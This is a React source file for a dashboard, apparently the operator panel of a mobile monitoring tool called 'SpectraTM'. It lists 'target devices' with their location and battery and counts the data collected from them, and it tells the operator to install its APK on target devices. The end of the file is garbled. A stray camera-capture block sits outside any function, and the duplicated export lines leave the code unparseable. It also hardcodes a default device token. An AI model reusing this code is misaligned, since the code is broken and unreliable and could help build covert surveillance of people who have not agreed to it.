import React, { useState, useEffect } from 'react';
import { Line, Bar, Doughnut } from 'react-chartjs-2';
import {
  Chart as ChartJS,
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement,
} from 'chart.js';

ChartJS.register(
  CategoryScale,
  LinearScale,
  PointElement,
  LineElement,
  BarElement,
  Title,
  Tooltip,
  Legend,
  ArcElement
);

const Dashboard = ({ socket, devices }) => {
  const [metrics, setMetrics] = useState({
    totalDevices: 0,
    activeDevices: 0,
    dataCollected: 0,
    alertsGenerated: 0,
    batteryAverage: 0,
    storageUsed: 0
  });

  const [activityData, setActivityData] = useState({
    labels: [],
    datasets: []
  });

  const [deviceStats, setDeviceStats] = useState({
    labels: ['Active', 'Inactive', 'Maintenance'],
    datasets: [{
      data: [0, 0, 0],
      backgroundColor: ['#00ff88', '#ff4444', '#ffaa00'],
      borderWidth: 0
    }]
  });

  useEffect(() => {
    if (socket) {
      socket.on('metrics_update', (data) => {
        setMetrics(data);
      });

      socket.on('activity_data', (data) => {
        setActivityData(data);
      });

      // Request initial metrics
      socket.emit('request_metrics');
    }
  }, [socket]);

  useEffect(() => {
    if (devices.length > 0) {
      const activeCount = devices.filter(d => d.status === 'active').length;
      const inactiveCount = devices.filter(d => d.status === 'inactive').length;
      const maintenanceCount = devices.filter(d => d.status === 'maintenance').length;

      setDeviceStats({
        labels: ['Active', 'Inactive', 'Maintenance'],
        datasets: [{
          data: [activeCount, inactiveCount, maintenanceCount],
          backgroundColor: ['#00ff88', '#ff4444', '#ffaa00'],
          borderWidth: 0
        }]
      });

      setMetrics(prev => ({
        ...prev,
        totalDevices: devices.length,
        activeDevices: activeCount,
        batteryAverage: Math.round(devices.reduce((acc, d) => acc + (d.battery || 0), 0) / devices.length || 0)
      }));
    }
  }, [devices]);

  const chartOptions = {
    responsive: true,
    maintainAspectRatio: false,
    plugins: {
      legend: {
        labels: {
          color: '#ffffff'
        }
      }
    },
    scales: {
      x: {
        ticks: { color: '#a0a0a0' },
        grid: { color: '#333344' }
      },
      y: {
        ticks: { color: '#a0a0a0' },
        grid: { color: '#333344' }
      }
    }
  };

  const doughnutOptions = {
    responsive: true,
    maintainAspectRatio: false,
    plugins: {
      legend: {
        position: 'bottom',
        labels: {
          color: '#ffffff',
          padding: 20
        }
      }
    }
  };

  return (
    <div className="dashboard fade-in">
      <div className="device-list">
        <h2>🔗 Connected Devices</h2>
        {devices.length === 0 ? (
          <div style={{ textAlign: 'center', padding: '2rem', color: '#a0a0a0' }}>
            <p>No devices connected</p>
            <p style={{ fontSize: '0.8rem', marginTop: '0.5rem' }}>
              Install SpectraTM APK on target devices to begin monitoring
            </p>
          </div>
        ) : (
          devices.map((device, index) => (
            <div key={index} className="device-item">
              <div className="device-info">
                <h3>{device.name || `Device ${device.id}`}</h3>
                <p>📱 {device.model} | 🔋 {device.battery}% | 📍 {device.location || 'Unknown'}</p>
                <p style={{ fontSize: '0.7rem', marginTop: '0.2rem' }}>
                  Last seen: {new Date(device.lastSeen).toLocaleString()}
                </p>
              </div>
              <span className={`device-status ${device.status}`}>
                {device.status === 'active' ? '🟢' : '🔴'} {device.status}
              </span>
            </div>
          ))
        )}
      </div>

      <div className="metrics-panel">
        <h2 style={{ marginBottom: '1.5rem', color: '#00ff88' }}>📊 System Metrics</h2>
        
        <div className="metrics-grid">
          <div className="metric-card">
            <span className="metric-value">{metrics.totalDevices}</span>
            <span className="metric-label">Total Devices</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.activeDevices}</span>
            <span className="metric-label">Active Devices</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{(metrics.dataCollected / 1024 / 1024).toFixed(1)}MB</span>
            <span className="metric-label">Data Collected</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.alertsGenerated}</span>
            <span className="metric-label">Alerts Generated</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{metrics.batteryAverage}%</span>
            <span className="metric-label">Avg Battery</span>
          </div>
          <div className="metric-card">
            <span className="metric-value">{(metrics.storageUsed / 1024 / 1024).toFixed(1)}MB</span>
            <span className="metric-label">Storage Used</span>
          </div>
        </div>

        <div style={{ display: 'grid', gridTemplateColumns: '2fr 1fr', gap: '1rem' }}>
          <div className="chart-container">
            <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>Activity Timeline</h3>
            {activityData.datasets && activityData.datasets.length > 0 ? (
              <Line data={activityData} options={chartOptions} />
            ) : (
              <div style={{ 
                display: 'flex', 
                alignItems: 'center', 
                justifyContent: 'center', 
                height: '100%', 
                color: '#a0a0a0' 
              }}>
                No activity data available
              </div>
            )}
          </div>
          
          <div className="chart-container">
            <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>Device Status</h3>
            <Doughnut data={deviceStats} options={doughnutOptions} />
          </div>
        </div>

        {/* Device Token Connection Section */}
        <DeviceConnection socket={socket} />
      </div>
    </div>
  );
};

// Device Token Connection Component
const DeviceConnection = ({ socket }) => {
  const [deviceToken, setDeviceToken] = useState('');
  const [connectionStatus, setConnectionStatus] = useState('disconnected');
  const [connectedDevice, setConnectedDevice] = useState(null);
  const [availableDevices, setAvailableDevices] = useState([]);
  const [connectionMessage, setConnectionMessage] = useState('');

  // Fetch available devices
  React.useEffect(() => {
    fetchAvailableDevices();
    const interval = setInterval(fetchAvailableDevices, 5000); // Refresh every 5 seconds
    return () => clearInterval(interval);
  }, []);

  const fetchAvailableDevices = async () => {
    try {
      const response = await fetch('/api/devices');
      const data = await response.json();
      setAvailableDevices(data.devices || []);
    } catch (error) {
      console.error('Error fetching devices:', error);
    }
  };

  const connectToDevice = () => {
    if (!deviceToken.trim()) {
      setConnectionMessage('❌ Please enter a device token');
      return;
    }
    
    setConnectionStatus('connecting');
    setConnectionMessage('🔄 Connecting to device...');
    
    // Check if device exists in available devices
    const device = availableDevices.find(d => d.id === deviceToken.trim());
    
    if (device) {
      if (device.isOnline) {
        // Connect via WebSocket
        if (socket) {
          socket.emit('connect_device', { deviceId: deviceToken.trim() });
          setConnectedDevice(device);
          setConnectionStatus('connected');
          setConnectionMessage(`✅ Connected to Device ${device.id}`);
        } else {
          setConnectionMessage('❌ WebSocket not available');
          setConnectionStatus('error');
        }
      } else {
        setConnectionMessage('⚠️ Device found but offline');
        setConnectionStatus('offline');
      }
    } else {
      setConnectionMessage('❌ Device not found. Make sure the device is running and connected.');
      setConnectionStatus('not_found');
    }
  };

  const disconnectDevice = () => {
    setConnectedDevice(null);
    setConnectionStatus('disconnected');
    setConnectionMessage('');
    setDeviceToken('');
  };

  const generateDeviceToken = () => {
    // Generate a simple token format for demo
    const token = 'dev_' + Math.random().toString(36).substr(2, 8);
    setDeviceToken(token);
    setConnectionMessage('💡 Generated sample token. Replace with real device token.');
  };

  const quickConnect = (deviceId) => {
    setDeviceToken(deviceId);
    setTimeout(() => connectToDevice(), 100);
  };

  return (
    <div className="chart-container" style={{ marginTop: '1rem' }}>
      <h3 style={{ marginBottom: '1rem', color: '#00ff88' }}>📱 Device Token Connection</h3>
      
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '2rem', marginBottom: '2rem' }}>
        
        {/* Connection Form */}
        <div style={{ 
          background: '#001100', 
          border: '1px solid #00ff88', 
          padding: '20px',
          borderRadius: '10px'
        }}>
          <h4 style={{ color: '#00ff88', marginBottom: '15px' }}>🔗 Manual Connection</h4>
          
          <div style={{ marginBottom: '15px' }}>
            <label style={{ 
              display: 'block', 
              marginBottom: '5px', 
              color: '#ffffff',
              fontSize: '14px'
            }}>
              Device Token:
            </label>
            <input 
              type="text"
              value={deviceToken}
              onChange={(e) => setDeviceToken(e.target.value)}
              placeholder="Enter device token (e.g., f47ac10b58cc4372a2c5)"
              style={{
                width: '100%',
                padding: '10px',
                background: '#002200',
                border: '1px solid #555',
                color: '#ffffff',
                borderRadius: '5px',
                fontSize: '14px'
              }}
              onKeyPress={(e) => {
                if (e.key === 'Enter') {
                  connectToDevice();
                }
              }}
            />
          </div>

          <div style={{ display: 'flex', gap: '10px', marginBottom: '15px' }}>
            <button 
              onClick={connectToDevice}
              disabled={connectionStatus === 'connecting'}
              style={{
                background: connectionStatus === 'connected' ? '#ff4444' : '#00ff88',
                color: '#000',
                border: 'none',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer',
                fontWeight: 'bold',
                flex: 1
              }}
            >
              {connectionStatus === 'connected' ? '🔌 Disconnect' : 
               connectionStatus === 'connecting' ? '⏳ Connecting...' : 
               '🔗 Connect'}
            </button>
            
            <button 
              onClick={generateDeviceToken}
              style={{
                background: '#ffaa00',
                color: '#000',
                border: 'none',
                padding: '10px 20px',
                borderRadius: '5px',
                cursor: 'pointer',
                fontWeight: 'bold'
              }}
            >
              🎲 Generate
            </button>
          </div>

          {connectionMessage && (
            <div style={{ 
              padding: '10px',
              background: connectionStatus === 'connected' ? '#001100' : 
                         connectionStatus === 'error' ? '#220000' : 
                         connectionStatus === 'connecting' ? '#221100' : '#001122',
              border: `1px solid ${
                connectionStatus === 'connected' ? '#00ff88' : 
                connectionStatus === 'error' ? '#ff4444' : 
                connectionStatus === 'connecting' ? '#ffaa00' : '#0088ff'
              }`,
              borderRadius: '5px',
              color: '#ffffff',
              fontSize: '14px'
            }}>
              {connectionMessage}
            </div>
          )}
        </div>

        {/* Available Devices */}
        <div style={{ 
          background: '#001100', 
          border: '1px solid #00ff88', 
          padding: '20px',
          borderRadius: '10px'
        }}>
          <h4 style={{ color: '#00ff88', marginBottom: '15px' }}>🎯 Quick Connect</h4>
          
          <div style={{ marginBottom: '15px' }}>
            <button 
              onClick={fetchAvailableDevices}
              style={{
                background: '#0088ff',
                color: '#000',
                border: 'none',
                padding: '8px 15px',
                borderRadius: '5px',
                cursor: 'pointer',
                fontSize: '12px',
                fontWeight: 'bold'
              }}
            >
              🔄 Refresh List
            </button>
          </div>

          <div style={{ maxHeight: '200px', overflowY: 'auto' }}>
            {availableDevices.length > 0 ? (
              availableDevices.map(device => (
                <div 
                  key={device.id}
                  onClick={() => quickConnect(device.id)}
                  style={{
                    padding: '10px',
                    margin: '5px 0',
                    background: device.isOnline ? '#002200' : '#220000',
                    border: `1px solid ${device.isOnline ? '#00ff88' : '#ff4444'}`,
                    borderRadius: '5px',
                    cursor: 'pointer',
                    display: 'flex',
                    justifyContent: 'space-between',
                    alignItems: 'center'
                  }}
                >
                  <div>
                    <div style={{ color: '#ffffff', fontSize: '14px', fontWeight: 'bold' }}>
                      {device.id}
                    </div>
                    <div style={{ color: '#a0a0a0', fontSize: '12px' }}>
                      Last seen: {new Date(device.lastSeen).toLocaleTimeString()}
                    </div>
                  </div>
                  <div style={{
                    width: '10px',
                    height: '10px',
                    borderRadius: '50%',
                    background: device.isOnline ? '#00ff88' : '#ff4444'
                  }} />
                </div>
              ))
            ) : (
              <div style={{ 
                color: '#a0a0a0', 
                textAlign: 'center',
                padding: '20px',
                fontSize: '14px'
              }}>
                No devices available.<br/>
                Make sure devices are running and connected.
              </div>
            )}
          </div>
        </div>
      </div>

      {/* Instructions */}
      <div style={{ 
        background: '#001100', 
        border: '1px solid #555', 
        padding: '15px',
        borderRadius: '5px',
        fontSize: '14px'
      }}>
        <h4 style={{ color: '#ffaa00', margin: '0 0 10px 0' }}>💡 How to Connect:</h4>
        <ul style={{ color: '#a0a0a0', margin: 0, paddingLeft: '20px' }}>
          <li><strong>Device Token:</strong> Each device has a unique token (usually the Device ID)</li>
          <li><strong>Manual:</strong> Enter the device token and click Connect</li>
          <li><strong>Quick Connect:</strong> Click on any available device in the list</li>
          <li><strong>Status:</strong> Green dot = Online, Red dot = Offline</li>
        </ul>
        
        <div style={{ marginTop: '10px', padding: '10px', background: '#002200', borderRadius: '5px' }}>
          <strong style={{ color: '#00ff88' }}>Default Token:</strong> f47ac10b58cc4372a2c5
        </div>
      </div>
    </div>
  );
};
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'environment',
          width: { ideal: 1280 },
          height: { ideal: 720 }
        } 
      });
      setCameraStream(stream);
      setIsScanning(true);
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }

export default Dashboard;
};

export default Dashboard;